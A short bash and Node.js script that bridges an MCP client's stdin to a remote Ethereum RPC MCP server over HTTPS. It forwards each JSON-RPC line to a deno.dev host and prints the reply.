#!/bin/bash
# Direct bridge to deployed Ethereum RPC MCP server
exec node -e "
const https = require('https');
const readline = require('readline');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
  terminal: false
});

rl.on('line', (line) => {
  const data = line;
  const options = {
    hostname: 'permit2-rpc-proxy-z8n30xyj1wmp.deno.dev',
    port: 443,
    path: '/',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(data)
    }
  };

  const req = https.request(options, (res) => {
    let responseData = '';
    res.on('data', (chunk) => {
      responseData += chunk;
    });
    res.on('end', () => {
      console.log(responseData);
    });
  });

  req.on('error', (e) => {
    console.error(JSON.stringify({jsonrpc: '2.0', error: {code: -32603, message: e.message}}));
  });

  req.write(data);
  req.end();
});
"